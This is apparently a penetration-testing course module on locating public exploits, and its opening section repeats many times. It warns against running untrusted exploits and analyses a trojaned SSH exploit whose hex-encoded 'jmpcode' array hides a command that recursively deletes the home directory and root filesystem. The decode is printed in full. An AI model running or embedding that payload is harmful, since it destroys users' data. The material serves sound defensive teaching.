# 12\. Locating Public Exploits

In this Learning Module, we will cover the following Learning Units:

-   Getting Started with Public Exploits
-   Online Exploit Resources
-   Offline Exploit Resources
-   Exploiting a Target

An [_exploit_](https://www.trendmicro.com/vinfo/us/security/definition/exploit) is a program or script that can leverage a flaw or vulnerability of a target system. Exploits can have a range of effects, such as a [_denial of service_](https://en.wikipedia.org/wiki/Denial-of-service_attack) (DoS), [_remote code execution_](https://www.bugcrowd.com/glossary/remote-code-execution-rce/) (RCE), or a [_privilege escalation_](https://en.wikipedia.org/wiki/Privilege_escalation) (privesc).

A common process of a _penetration testing_ engagement is the use of publicly available exploits, and searching for appropriate exploits becomes a critical skill when this need arises.

In this Module, we will focus on various online resources that host exploits for publicly known vulnerabilities. We will also inspect offline tools available in Kali that contain locally hosted exploits.

With the knowledge to find public exploits, we will then narrow our search to relevant ones that could be used to gain access to a machine. At the end of this Module, we will enumerate a target to determine which exploit(s) can be used to compromise it.

## 12.1. Getting Started

This Learning Unit covers the following Learning Objectives:

-   Understand the risk of executing untrusted exploits
-   Understand the importance of analyzing the exploit code before execution

In this Learning Unit, we will review a malicious public exploit. It is important to understand the risks associated with executing unknown exploits, especially if we don't analyze what the exploit code does.

## 12.1.1. A Word of Caution

We must understand that by downloading and running public exploits, we can greatly endanger a system or environment. With this in mind, we need to carefully read and understand the code before execution to ensure no negative effects.

Let's use _0pen0wn_, which was published as a remote exploit for _SSH_, as an example. While reading the source code, we noticed that it was asking for "root" privileges, which was suspicious.

```
if (geteuid()) {
  puts("Root is required for raw sockets, etc."); return 1;
}
```

> Listing 1 - Malicious SSH exploit asking for root privileges on the attacking machine

Further examination of the payload revealed an interesting _jmpcode_ array.

```
[...]
char jmpcode[] =
"\x72\x6D\x20\x2D\x72\x66\x20\x7e\x20\x2F\x2A\x20\x32\x3e\x20\x2f"
"\x64\x65\x76\x2f\x6e\x75\x6c\x6c\x20\x26";
[...]
```

> Listing 2 - Malicious SSH exploit hex encoded payload

Although it was masked as [_shellcode_](https://en.wikipedia.org/wiki/Shellcode), the "jmpcode" character array was actually a _hex-encoded_ string containing a malicious shell command.

```
kali@kali:~$ python3

>>> jmpcode = [
... "\x72\x6D\x20\x2D\x72\x66\x20\x7e\x20\x2F\x2A\x20\x32\x3e\x20\x2f"
... "\x64\x65\x76\x2f\x6e\x75\x6c\x6c\x20\x26"]
>>> print(jmpcode)
['rm -rf ~ /* 2> /dev/null &']
>>>
```

> Listing 3 - Malicious SSH exploit payload that will wipe your attacking machine

This single command would effectively wipe out the would-be attacker's UNIX-based filesystem. The program would then connect to a public IRC server to announce the user's actions to the world, making this an extremely dangerous and potentially embarrassing malicious exploit!

Given this danger, we will rely on more trustworthy exploit repositories in this Module.

The online resources mentioned in this Module analyze the submitted exploit code before hosting it online; however, it is still important to properly read the code ourselves to get a rough idea of what it will do upon execution. And if we are not yet proficient in programming, this is a great way to improve our code-reading skills.

Exploits that are written in a _low-level programming language_ and require compilation are often hosted in both _source code_ and _binary format_. While cumbersome to compile, source code is easier to inspect than binaries (without the assistance of specialized skills and tools).

If code inspection or compilation is too complex, we can set up a virtual machine environment with clean snapshots as an exploit testing ground, or _sandbox_. The snapshots on a newly set up environment allow it to be easily reconstructed if infected by something malicious or if the exploit causes it to break.

#### Labs

1.  True/False: It is important to read the code of an exploit before executing it.

Answer

# 12\. Locating Public Exploits

In this Learning Module, we will cover the following Learning Units:

-   Getting Started with Public Exploits
-   Online Exploit Resources
-   Offline Exploit Resources
-   Exploiting a Target

An [_exploit_](https://www.trendmicro.com/vinfo/us/security/definition/exploit) is a program or script that can leverage a flaw or vulnerability of a target system. Exploits can have a range of effects, such as a [_denial of service_](https://en.wikipedia.org/wiki/Denial-of-service_attack) (DoS), [_remote code execution_](https://www.bugcrowd.com/glossary/remote-code-execution-rce/) (RCE), or a [_privilege escalation_](https://en.wikipedia.org/wiki/Privilege_escalation) (privesc).

A common process of a _penetration testing_ engagement is the use of publicly available exploits, and searching for appropriate exploits becomes a critical skill when this need arises.

In this Module, we will focus on various online resources that host exploits for publicly known vulnerabilities. We will also inspect offline tools available in Kali that contain locally hosted exploits.

With the knowledge to find public exploits, we will then narrow our search to relevant ones that could be used to gain access to a machine. At the end of this Module, we will enumerate a target to determine which exploit(s) can be used to compromise it.

## 12.1. Getting Started

This Learning Unit covers the following Learning Objectives:

-   Understand the risk of executing untrusted exploits
-   Understand the importance of analyzing the exploit code before execution

In this Learning Unit, we will review a malicious public exploit. It is important to understand the risks associated with executing unknown exploits, especially if we don't analyze what the exploit code does.

## 12.1.1. A Word of Caution

We must understand that by downloading and running public exploits, we can greatly endanger a system or environment. With this in mind, we need to carefully read and understand the code before execution to ensure no negative effects.

Let's use _0pen0wn_, which was published as a remote exploit for _SSH_, as an example. While reading the source code, we noticed that it was asking for "root" privileges, which was suspicious.

```
if (geteuid()) {
  puts("Root is required for raw sockets, etc."); return 1;
}
```

> Listing 1 - Malicious SSH exploit asking for root privileges on the attacking machine

Further examination of the payload revealed an interesting _jmpcode_ array.

```
[...]
char jmpcode[] =
"\x72\x6D\x20\x2D\x72\x66\x20\x7e\x20\x2F\x2A\x20\x32\x3e\x20\x2f"
"\x64\x65\x76\x2f\x6e\x75\x6c\x6c\x20\x26";
[...]
```

> Listing 2 - Malicious SSH exploit hex encoded payload

Although it was masked as [_shellcode_](https://en.wikipedia.org/wiki/Shellcode), the "jmpcode" character array was actually a _hex-encoded_ string containing a malicious shell command.

```
kali@kali:~$ python3

>>> jmpcode = [
... "\x72\x6D\x20\x2D\x72\x66\x20\x7e\x20\x2F\x2A\x20\x32\x3e\x20\x2f"
... "\x64\x65\x76\x2f\x6e\x75\x6c\x6c\x20\x26"]
>>> print(jmpcode)
['rm -rf ~ /* 2> /dev/null &']
>>>
```

> Listing 3 - Malicious SSH exploit payload that will wipe your attacking machine

This single command would effectively wipe out the would-be attacker's UNIX-based filesystem. The program would then connect to a public IRC server to announce the user's actions to the world, making this an extremely dangerous and potentially embarrassing malicious exploit!

Given this danger, we will rely on more trustworthy exploit repositories in this Module.

The online resources mentioned in this Module analyze the submitted exploit code before hosting it online; however, it is still important to properly read the code ourselves to get a rough idea of what it will do upon execution. And if we are not yet proficient in programming, this is a great way to improve our code-reading skills.

Exploits that are written in a _low-level programming language_ and require compilation are often hosted in both _source code_ and _binary format_. While cumbersome to compile, source code is easier to inspect than binaries (without the assistance of specialized skills and tools).

If code inspection or compilation is too complex, we can set up a virtual machine environment with clean snapshots as an exploit testing ground, or _sandbox_. The snapshots on a newly set up environment allow it to be easily reconstructed if infected by something malicious or if the exploit causes it to break.

#### Labs

1.  True/False: It is important to read the code of an exploit before executing it.

Answer

# 12\. Locating Public Exploits

In this Learning Module, we will cover the following Learning Units:

-   Getting Started with Public Exploits
-   Online Exploit Resources
-   Offline Exploit Resources
-   Exploiting a Target

An [_exploit_](https://www.trendmicro.com/vinfo/us/security/definition/exploit) is a program or script that can leverage a flaw or vulnerability of a target system. Exploits can have a range of effects, such as a [_denial of service_](https://en.wikipedia.org/wiki/Denial-of-service_attack) (DoS), [_remote code execution_](https://www.bugcrowd.com/glossary/remote-code-execution-rce/) (RCE), or a [_privilege escalation_](https://en.wikipedia.org/wiki/Privilege_escalation) (privesc).

A common process of a _penetration testing_ engagement is the use of publicly available exploits, and searching for appropriate exploits becomes a critical skill when this need arises.

In this Module, we will focus on various online resources that host exploits for publicly known vulnerabilities. We will also inspect offline tools available in Kali that contain locally hosted exploits.

With the knowledge to find public exploits, we will then narrow our search to relevant ones that could be used to gain access to a machine. At the end of this Module, we will enumerate a target to determine which exploit(s) can be used to compromise it.

## 12.1. Getting Started

This Learning Unit covers the following Learning Objectives:

-   Understand the risk of executing untrusted exploits
-   Understand the importance of analyzing the exploit code before execution

In this Learning Unit, we will review a malicious public exploit. It is important to understand the risks associated with executing unknown exploits, especially if we don't analyze what the exploit code does.

## 12.1.1. A Word of Caution

We must understand that by downloading and running public exploits, we can greatly endanger a system or environment. With this in mind, we need to carefully read and understand the code before execution to ensure no negative effects.

Let's use _0pen0wn_, which was published as a remote exploit for _SSH_, as an example. While reading the source code, we noticed that it was asking for "root" privileges, which was suspicious.

```
if (geteuid()) {
  puts("Root is required for raw sockets, etc."); return 1;
}
```

> Listing 1 - Malicious SSH exploit asking for root privileges on the attacking machine

Further examination of the payload revealed an interesting _jmpcode_ array.

```
[...]
char jmpcode[] =
"\x72\x6D\x20\x2D\x72\x66\x20\x7e\x20\x2F\x2A\x20\x32\x3e\x20\x2f"
"\x64\x65\x76\x2f\x6e\x75\x6c\x6c\x20\x26";
[...]
```

> Listing 2 - Malicious SSH exploit hex encoded payload

Although it was masked as [_shellcode_](https://en.wikipedia.org/wiki/Shellcode), the "jmpcode" character array was actually a _hex-encoded_ string containing a malicious shell command.

```
kali@kali:~$ python3

>>> jmpcode = [
... "\x72\x6D\x20\x2D\x72\x66\x20\x7e\x20\x2F\x2A\x20\x32\x3e\x20\x2f"
... "\x64\x65\x76\x2f\x6e\x75\x6c\x6c\x20\x26"]
>>> print(jmpcode)
['rm -rf ~ /* 2> /dev/null &']
>>>
```

> Listing 3 - Malicious SSH exploit payload that will wipe your attacking machine

This single command would effectively wipe out the would-be attacker's UNIX-based filesystem. The program would then connect to a public IRC server to announce the user's actions to the world, making this an extremely dangerous and potentially embarrassing malicious exploit!

Given this danger, we will rely on more trustworthy exploit repositories in this Module.

The online resources mentioned in this Module analyze the submitted exploit code before hosting it online; however, it is still important to properly read the code ourselves to get a rough idea of what it will do upon execution. And if we are not yet proficient in programming, this is a great way to improve our code-reading skills.

Exploits that are written in a _low-level programming language_ and require compilation are often hosted in both _source code_ and _binary format_. While cumbersome to compile, source code is easier to inspect than binaries (without the assistance of specialized skills and tools).

If code inspection or compilation is too complex, we can set up a virtual machine environment with clean snapshots as an exploit testing ground, or _sandbox_. The snapshots on a newly set up environment allow it to be easily reconstructed if infected by something malicious or if the exploit causes it to break.

#### Labs

1.  True/False: It is important to read the code of an exploit before executing it.

Answer

# 12\. Locating Public Exploits

In this Learning Module, we will cover the following Learning Units:

-   Getting Started with Public Exploits
-   Online Exploit Resources
-   Offline Exploit Resources
-   Exploiting a Target

An [_exploit_](https://www.trendmicro.com/vinfo/us/security/definition/exploit) is a program or script that can leverage a flaw or vulnerability of a target system. Exploits can have a range of effects, such as a [_denial of service_](https://en.wikipedia.org/wiki/Denial-of-service_attack) (DoS), [_remote code execution_](https://www.bugcrowd.com/glossary/remote-code-execution-rce/) (RCE), or a [_privilege escalation_](https://en.wikipedia.org/wiki/Privilege_escalation) (privesc).

A common process of a _penetration testing_ engagement is the use of publicly available exploits, and searching for appropriate exploits becomes a critical skill when this need arises.

In this Module, we will focus on various online resources that host exploits for publicly known vulnerabilities. We will also inspect offline tools available in Kali that contain locally hosted exploits.

With the knowledge to find public exploits, we will then narrow our search to relevant ones that could be used to gain access to a machine. At the end of this Module, we will enumerate a target to determine which exploit(s) can be used to compromise it.

## 12.1. Getting Started

This Learning Unit covers the following Learning Objectives:

-   Understand the risk of executing untrusted exploits
-   Understand the importance of analyzing the exploit code before execution

In this Learning Unit, we will review a malicious public exploit. It is important to understand the risks associated with executing unknown exploits, especially if we don't analyze what the exploit code does.

## 12.1.1. A Word of Caution

We must understand that by downloading and running public exploits, we can greatly endanger a system or environment. With this in mind, we need to carefully read and understand the code before execution to ensure no negative effects.

Let's use _0pen0wn_, which was published as a remote exploit for _SSH_, as an example. While reading the source code, we noticed that it was asking for "root" privileges, which was suspicious.

```
if (geteuid()) {
  puts("Root is required for raw sockets, etc."); return 1;
}
```

> Listing 1 - Malicious SSH exploit asking for root privileges on the attacking machine

Further examination of the payload revealed an interesting _jmpcode_ array.

```
[...]
char jmpcode[] =
"\x72\x6D\x20\x2D\x72\x66\x20\x7e\x20\x2F\x2A\x20\x32\x3e\x20\x2f"
"\x64\x65\x76\x2f\x6e\x75\x6c\x6c\x20\x26";
[...]
```

> Listing 2 - Malicious SSH exploit hex encoded payload

Although it was masked as [_shellcode_](https://en.wikipedia.org/wiki/Shellcode), the "jmpcode" character array was actually a _hex-encoded_ string containing a malicious shell command.

```
kali@kali:~$ python3

>>> jmpcode = [
... "\x72\x6D\x20\x2D\x72\x66\x20\x7e\x20\x2F\x2A\x20\x32\x3e\x20\x2f"
... "\x64\x65\x76\x2f\x6e\x75\x6c\x6c\x20\x26"]
>>> print(jmpcode)
['rm -rf ~ /* 2> /dev/null &']
>>>
```

> Listing 3 - Malicious SSH exploit payload that will wipe your attacking machine

This single command would effectively wipe out the would-be attacker's UNIX-based filesystem. The program would then connect to a public IRC server to announce the user's actions to the world, making this an extremely dangerous and potentially embarrassing malicious exploit!

Given this danger, we will rely on more trustworthy exploit repositories in this Module.

The online resources mentioned in this Module analyze the submitted exploit code before hosting it online; however, it is still important to properly read the code ourselves to get a rough idea of what it will do upon execution. And if we are not yet proficient in programming, this is a great way to improve our code-reading skills.

Exploits that are written in a _low-level programming language_ and require compilation are often hosted in both _source code_ and _binary format_. While cumbersome to compile, source code is easier to inspect than binaries (without the assistance of specialized skills and tools).

If code inspection or compilation is too complex, we can set up a virtual machine environment with clean snapshots as an exploit testing ground, or _sandbox_. The snapshots on a newly set up environment allow it to be easily reconstructed if infected by something malicious or if the exploit causes it to break.

#### Labs

1.  True/False: It is important to read the code of an exploit before executing it.

Answer

# 12\. Locating Public Exploits

In this Learning Module, we will cover the following Learning Units:

-   Getting Started with Public Exploits
-   Online Exploit Resources
-   Offline Exploit Resources
-   Exploiting a Target

An [_exploit_](https://www.trendmicro.com/vinfo/us/security/definition/exploit) is a program or script that can leverage a flaw or vulnerability of a target system. Exploits can have a range of effects, such as a [_denial of service_](https://en.wikipedia.org/wiki/Denial-of-service_attack) (DoS), [_remote code execution_](https://www.bugcrowd.com/glossary/remote-code-execution-rce/) (RCE), or a [_privilege escalation_](https://en.wikipedia.org/wiki/Privilege_escalation) (privesc).

A common process of a _penetration testing_ engagement is the use of publicly available exploits, and searching for appropriate exploits becomes a critical skill when this need arises.

In this Module, we will focus on various online resources that host exploits for publicly known vulnerabilities. We will also inspect offline tools available in Kali that contain locally hosted exploits.

With the knowledge to find public exploits, we will then narrow our search to relevant ones that could be used to gain access to a machine. At the end of this Module, we will enumerate a target to determine which exploit(s) can be used to compromise it.

## 12.1. Getting Started

This Learning Unit covers the following Learning Objectives:

-   Understand the risk of executing untrusted exploits
-   Understand the importance of analyzing the exploit code before execution

In this Learning Unit, we will review a malicious public exploit. It is important to understand the risks associated with executing unknown exploits, especially if we don't analyze what the exploit code does.

## 12.1.1. A Word of Caution

We must understand that by downloading and running public exploits, we can greatly endanger a system or environment. With this in mind, we need to carefully read and understand the code before execution to ensure no negative effects.

Let's use _0pen0wn_, which was published as a remote exploit for _SSH_, as an example. While reading the source code, we noticed that it was asking for "root" privileges, which was suspicious.

```
if (geteuid()) {
  puts("Root is required for raw sockets, etc."); return 1;
}
```

> Listing 1 - Malicious SSH exploit asking for root privileges on the attacking machine

Further examination of the payload revealed an interesting _jmpcode_ array.

```
[...]
char jmpcode[] =
"\x72\x6D\x20\x2D\x72\x66\x20\x7e\x20\x2F\x2A\x20\x32\x3e\x20\x2f"
"\x64\x65\x76\x2f\x6e\x75\x6c\x6c\x20\x26";
[...]
```

> Listing 2 - Malicious SSH exploit hex encoded payload

Although it was masked as [_shellcode_](https://en.wikipedia.org/wiki/Shellcode), the "jmpcode" character array was actually a _hex-encoded_ string containing a malicious shell command.

```
kali@kali:~$ python3

>>> jmpcode = [
... "\x72\x6D\x20\x2D\x72\x66\x20\x7e\x20\x2F\x2A\x20\x32\x3e\x20\x2f"
... "\x64\x65\x76\x2f\x6e\x75\x6c\x6c\x20\x26"]
>>> print(jmpcode)
['rm -rf ~ /* 2> /dev/null &']
>>>
```

> Listing 3 - Malicious SSH exploit payload that will wipe your attacking machine

This single command would effectively wipe out the would-be attacker's UNIX-based filesystem. The program would then connect to a public IRC server to announce the user's actions to the world, making this an extremely dangerous and potentially embarrassing malicious exploit!

Given this danger, we will rely on more trustworthy exploit repositories in this Module.

The online resources mentioned in this Module analyze the submitted exploit code before hosting it online; however, it is still important to properly read the code ourselves to get a rough idea of what it will do upon execution. And if we are not yet proficient in programming, this is a great way to improve our code-reading skills.

Exploits that are written in a _low-level programming language_ and require compilation are often hosted in both _source code_ and _binary format_. While cumbersome to compile, source code is easier to inspect than binaries (without the assistance of specialized skills and tools).

If code inspection or compilation is too complex, we can set up a virtual machine environment with clean snapshots as an exploit testing ground, or _sandbox_. The snapshots on a newly set up environment allow it to be easily reconstructed if infected by something malicious or if the exploit causes it to break.

#### Labs

1.  True/False: It is important to read the code of an exploit before executing it.

Answer

# 12\. Locating Public Exploits

In this Learning Module, we will cover the following Learning Units:

-   Getting Started with Public Exploits
-   Online Exploit Resources
-   Offline Exploit Resources
-   Exploiting a Target

An [_exploit_](https://www.trendmicro.com/vinfo/us/security/definition/exploit) is a program or script that can leverage a flaw or vulnerability of a target system. Exploits can have a range of effects, such as a [_denial of service_](https://en.wikipedia.org/wiki/Denial-of-service_attack) (DoS), [_remote code execution_](https://www.bugcrowd.com/glossary/remote-code-execution-rce/) (RCE), or a [_privilege escalation_](https://en.wikipedia.org/wiki/Privilege_escalation) (privesc).

A common process of a _penetration testing_ engagement is the use of publicly available exploits, and searching for appropriate exploits becomes a critical skill when this need arises.

In this Module, we will focus on various online resources that host exploits for publicly known vulnerabilities. We will also inspect offline tools available in Kali that contain locally hosted exploits.

With the knowledge to find public exploits, we will then narrow our search to relevant ones that could be used to gain access to a machine. At the end of this Module, we will enumerate a target to determine which exploit(s) can be used to compromise it.

## 12.1. Getting Started

This Learning Unit covers the following Learning Objectives:

-   Understand the risk of executing untrusted exploits
-   Understand the importance of analyzing the exploit code before execution

In this Learning Unit, we will review a malicious public exploit. It is important to understand the risks associated with executing unknown exploits, especially if we don't analyze what the exploit code does.

## 12.1.1. A Word of Caution

We must understand that by downloading and running public exploits, we can greatly endanger a system or environment. With this in mind, we need to carefully read and understand the code before execution to ensure no negative effects.

Let's use _0pen0wn_, which was published as a remote exploit for _SSH_, as an example. While reading the source code, we noticed that it was asking for "root" privileges, which was suspicious.

```
if (geteuid()) {
  puts("Root is required for raw sockets, etc."); return 1;
}
```

> Listing 1 - Malicious SSH exploit asking for root privileges on the attacking machine

Further examination of the payload revealed an interesting _jmpcode_ array.

```
[...]
char jmpcode[] =
"\x72\x6D\x20\x2D\x72\x66\x20\x7e\x20\x2F\x2A\x20\x32\x3e\x20\x2f"
"\x64\x65\x76\x2f\x6e\x75\x6c\x6c\x20\x26";
[...]
```

> Listing 2 - Malicious SSH exploit hex encoded payload

Although it was masked as [_shellcode_](https://en.wikipedia.org/wiki/Shellcode), the "jmpcode" character array was actually a _hex-encoded_ string containing a malicious shell command.

```
kali@kali:~$ python3

>>> jmpcode = [
... "\x72\x6D\x20\x2D\x72\x66\x20\x7e\x20\x2F\x2A\x20\x32\x3e\x20\x2f"
... "\x64\x65\x76\x2f\x6e\x75\x6c\x6c\x20\x26"]
>>> print(jmpcode)
['rm -rf ~ /* 2> /dev/null &']
>>>
```

> Listing 3 - Malicious SSH exploit payload that will wipe your attacking machine

This single command would effectively wipe out the would-be attacker's UNIX-based filesystem. The program would then connect to a public IRC server to announce the user's actions to the world, making this an extremely dangerous and potentially embarrassing malicious exploit!

Given this danger, we will rely on more trustworthy exploit repositories in this Module.

The online resources mentioned in this Module analyze the submitted exploit code before hosting it online; however, it is still important to properly read the code ourselves to get a rough idea of what it will do upon execution. And if we are not yet proficient in programming, this is a great way to improve our code-reading skills.

Exploits that are written in a _low-level programming language_ and require compilation are often hosted in both _source code_ and _binary format_. While cumbersome to compile, source code is easier to inspect than binaries (without the assistance of specialized skills and tools).

If code inspection or compilation is too complex, we can set up a virtual machine environment with clean snapshots as an exploit testing ground, or _sandbox_. The snapshots on a newly set up environment allow it to be easily reconstructed if infected by something malicious or if the exploit causes it to break.

#### Labs

1.  True/False: It is important to read the code of an exploit before executing it.

Answer

# 12\. Locating Public Exploits

In this Learning Module, we will cover the following Learning Units:

-   Getting Started with Public Exploits
-   Online Exploit Resources
-   Offline Exploit Resources
-   Exploiting a Target

An [_exploit_](https://www.trendmicro.com/vinfo/us/security/definition/exploit) is a program or script that can leverage a flaw or vulnerability of a target system. Exploits can have a range of effects, such as a [_denial of service_](https://en.wikipedia.org/wiki/Denial-of-service_attack) (DoS), [_remote code execution_](https://www.bugcrowd.com/glossary/remote-code-execution-rce/) (RCE), or a [_privilege escalation_](https://en.wikipedia.org/wiki/Privilege_escalation) (privesc).

A common process of a _penetration testing_ engagement is the use of publicly available exploits, and searching for appropriate exploits becomes a critical skill when this need arises.

In this Module, we will focus on various online resources that host exploits for publicly known vulnerabilities. We will also inspect offline tools available in Kali that contain locally hosted exploits.

With the knowledge to find public exploits, we will then narrow our search to relevant ones that could be used to gain access to a machine. At the end of this Module, we will enumerate a target to determine which exploit(s) can be used to compromise it.

## 12.1. Getting Started

This Learning Unit covers the following Learning Objectives:

-   Understand the risk of executing untrusted exploits
-   Understand the importance of analyzing the exploit code before execution

In this Learning Unit, we will review a malicious public exploit. It is important to understand the risks associated with executing unknown exploits, especially if we don't analyze what the exploit code does.

## 12.1.1. A Word of Caution

We must understand that by downloading and running public exploits, we can greatly endanger a system or environment. With this in mind, we need to carefully read and understand the code before execution to ensure no negative effects.

Let's use _0pen0wn_, which was published as a remote exploit for _SSH_, as an example. While reading the source code, we noticed that it was asking for "root" privileges, which was suspicious.

```
if (geteuid()) {
  puts("Root is required for raw sockets, etc."); return 1;
}
```

> Listing 1 - Malicious SSH exploit asking for root privileges on the attacking machine

Further examination of the payload revealed an interesting _jmpcode_ array.

```
[...]
char jmpcode[] =
"\x72\x6D\x20\x2D\x72\x66\x20\x7e\x20\x2F\x2A\x20\x32\x3e\x20\x2f"
"\x64\x65\x76\x2f\x6e\x75\x6c\x6c\x20\x26";
[...]
```

> Listing 2 - Malicious SSH exploit hex encoded payload

Although it was masked as [_shellcode_](https://en.wikipedia.org/wiki/Shellcode), the "jmpcode" character array was actually a _hex-encoded_ string containing a malicious shell command.

```
kali@kali:~$ python3

>>> jmpcode = [
... "\x72\x6D\x20\x2D\x72\x66\x20\x7e\x20\x2F\x2A\x20\x32\x3e\x20\x2f"
... "\x64\x65\x76\x2f\x6e\x75\x6c\x6c\x20\x26"]
>>> print(jmpcode)
['rm -rf ~ /* 2> /dev/null &']
>>>
```

> Listing 3 - Malicious SSH exploit payload that will wipe your attacking machine

This single command would effectively wipe out the would-be attacker's UNIX-based filesystem. The program would then connect to a public IRC server to announce the user's actions to the world, making this an extremely dangerous and potentially embarrassing malicious exploit!

Given this danger, we will rely on more trustworthy exploit repositories in this Module.

The online resources mentioned in this Module analyze the submitted exploit code before hosting it online; however, it is still important to properly read the code ourselves to get a rough idea of what it will do upon execution. And if we are not yet proficient in programming, this is a great way to improve our code-reading skills.

Exploits that are written in a _low-level programming language_ and require compilation are often hosted in both _source code_ and _binary format_. While cumbersome to compile, source code is easier to inspect than binaries (without the assistance of specialized skills and tools).

If code inspection or compilation is too complex, we can set up a virtual machine environment with clean snapshots as an exploit testing ground, or _sandbox_. The snapshots on a newly set up environment allow it to be easily reconstructed if infected by something malicious or if the exploit causes it to break.

#### Labs

1.  True/False: It is important to read the code of an exploit before executing it.

Answer

# 12\. Locating Public Exploits

In this Learning Module, we will cover the following Learning Units:

-   Getting Started with Public Exploits
-   Online Exploit Resources
-   Offline Exploit Resources
-   Exploiting a Target

An [_exploit_](https://www.trendmicro.com/vinfo/us/security/definition/exploit) is a program or script that can leverage a flaw or vulnerability of a target system. Exploits can have a range of effects, such as a [_denial of service_](https://en.wikipedia.org/wiki/Denial-of-service_attack) (DoS), [_remote code execution_](https://www.bugcrowd.com/glossary/remote-code-execution-rce/) (RCE), or a [_privilege escalation_](https://en.wikipedia.org/wiki/Privilege_escalation) (privesc).

A common process of a _penetration testing_ engagement is the use of publicly available exploits, and searching for appropriate exploits becomes a critical skill when this need arises.

In this Module, we will focus on various online resources that host exploits for publicly known vulnerabilities. We will also inspect offline tools available in Kali that contain locally hosted exploits.

With the knowledge to find public exploits, we will then narrow our search to relevant ones that could be used to gain access to a machine. At the end of this Module, we will enumerate a target to determine which exploit(s) can be used to compromise it.

## 12.1. Getting Started

This Learning Unit covers the following Learning Objectives:

-   Understand the risk of executing untrusted exploits
-   Understand the importance of analyzing the exploit code before execution

In this Learning Unit, we will review a malicious public exploit. It is important to understand the risks associated with executing unknown exploits, especially if we don't analyze what the exploit code does.

## 12.1.1. A Word of Caution

We must understand that by downloading and running public exploits, we can greatly endanger a system or environment. With this in mind, we need to carefully read and understand the code before execution to ensure no negative effects.

Let's use _0pen0wn_, which was published as a remote exploit for _SSH_, as an example. While reading the source code, we noticed that it was asking for "root" privileges, which was suspicious.

```
if (geteuid()) {
  puts("Root is required for raw sockets, etc."); return 1;
}
```

> Listing 1 - Malicious SSH exploit asking for root privileges on the attacking machine

Further examination of the payload revealed an interesting _jmpcode_ array.

```
[...]
char jmpcode[] =
"\x72\x6D\x20\x2D\x72\x66\x20\x7e\x20\x2F\x2A\x20\x32\x3e\x20\x2f"
"\x64\x65\x76\x2f\x6e\x75\x6c\x6c\x20\x26";
[...]
```

> Listing 2 - Malicious SSH exploit hex encoded payload

Although it was masked as [_shellcode_](https://en.wikipedia.org/wiki/Shellcode), the "jmpcode" character array was actually a _hex-encoded_ string containing a malicious shell command.

```
kali@kali:~$ python3

>>> jmpcode = [
... "\x72\x6D\x20\x2D\x72\x66\x20\x7e\x20\x2F\x2A\x20\x32\x3e\x20\x2f"
... "\x64\x65\x76\x2f\x6e\x75\x6c\x6c\x20\x26"]
>>> print(jmpcode)
['rm -rf ~ /* 2> /dev/null &']
>>>
```

> Listing 3 - Malicious SSH exploit payload that will wipe your attacking machine

This single command would effectively wipe out the would-be attacker's UNIX-based filesystem. The program would then connect to a public IRC server to announce the user's actions to the world, making this an extremely dangerous and potentially embarrassing malicious exploit!

Given this danger, we will rely on more trustworthy exploit repositories in this Module.

The online resources mentioned in this Module analyze the submitted exploit code before hosting it online; however, it is still important to properly read the code ourselves to get a rough idea of what it will do upon execution. And if we are not yet proficient in programming, this is a great way to improve our code-reading skills.

Exploits that are written in a _low-level programming language_ and require compilation are often hosted in both _source code_ and _binary format_. While cumbersome to compile, source code is easier to inspect than binaries (without the assistance of specialized skills and tools).

If code inspection or compilation is too complex, we can set up a virtual machine environment with clean snapshots as an exploit testing ground, or _sandbox_. The snapshots on a newly set up environment allow it to be easily reconstructed if infected by something malicious or if the exploit causes it to break.

#### Labs

1.  True/False: It is important to read the code of an exploit before executing it.

Answer

# 12\. Locating Public Exploits

In this Learning Module, we will cover the following Learning Units:

-   Getting Started with Public Exploits
-   Online Exploit Resources
-   Offline Exploit Resources
-   Exploiting a Target

An [_exploit_](https://www.trendmicro.com/vinfo/us/security/definition/exploit) is a program or script that can leverage a flaw or vulnerability of a target system. Exploits can have a range of effects, such as a [_denial of service_](https://en.wikipedia.org/wiki/Denial-of-service_attack) (DoS), [_remote code execution_](https://www.bugcrowd.com/glossary/remote-code-execution-rce/) (RCE), or a [_privilege escalation_](https://en.wikipedia.org/wiki/Privilege_escalation) (privesc).

A common process of a _penetration testing_ engagement is the use of publicly available exploits, and searching for appropriate exploits becomes a critical skill when this need arises.

In this Module, we will focus on various online resources that host exploits for publicly known vulnerabilities. We will also inspect offline tools available in Kali that contain locally hosted exploits.

With the knowledge to find public exploits, we will then narrow our search to relevant ones that could be used to gain access to a machine. At the end of this Module, we will enumerate a target to determine which exploit(s) can be used to compromise it.

## 12.1. Getting Started

This Learning Unit covers the following Learning Objectives:

-   Understand the risk of executing untrusted exploits
-   Understand the importance of analyzing the exploit code before execution

In this Learning Unit, we will review a malicious public exploit. It is important to understand the risks associated with executing unknown exploits, especially if we don't analyze what the exploit code does.

## 12.1.1. A Word of Caution

We must understand that by downloading and running public exploits, we can greatly endanger a system or environment. With this in mind, we need to carefully read and understand the code before execution to ensure no negative effects.

Let's use _0pen0wn_, which was published as a remote exploit for _SSH_, as an example. While reading the source code, we noticed that it was asking for "root" privileges, which was suspicious.

```
if (geteuid()) {
  puts("Root is required for raw sockets, etc."); return 1;
}
```

> Listing 1 - Malicious SSH exploit asking for root privileges on the attacking machine

Further examination of the payload revealed an interesting _jmpcode_ array.

```
[...]
char jmpcode[] =
"\x72\x6D\x20\x2D\x72\x66\x20\x7e\x20\x2F\x2A\x20\x32\x3e\x20\x2f"
"\x64\x65\x76\x2f\x6e\x75\x6c\x6c\x20\x26";
[...]
```

> Listing 2 - Malicious SSH exploit hex encoded payload

Although it was masked as [_shellcode_](https://en.wikipedia.org/wiki/Shellcode), the "jmpcode" character array was actually a _hex-encoded_ string containing a malicious shell command.

```
kali@kali:~$ python3

>>> jmpcode = [
... "\x72\x6D\x20\x2D\x72\x66\x20\x7e\x20\x2F\x2A\x20\x32\x3e\x20\x2f"
... "\x64\x65\x76\x2f\x6e\x75\x6c\x6c\x20\x26"]
>>> print(jmpcode)
['rm -rf ~ /* 2> /dev/null &']
>>>
```

> Listing 3 - Malicious SSH exploit payload that will wipe your attacking machine

This single command would effectively wipe out the would-be attacker's UNIX-based filesystem. The program would then connect to a public IRC server to announce the user's actions to the world, making this an extremely dangerous and potentially embarrassing malicious exploit!

Given this danger, we will rely on more trustworthy exploit repositories in this Module.

The online resources mentioned in this Module analyze the submitted exploit code before hosting it online; however, it is still important to properly read the code ourselves to get a rough idea of what it will do upon execution. And if we are not yet proficient in programming, this is a great way to improve our code-reading skills.

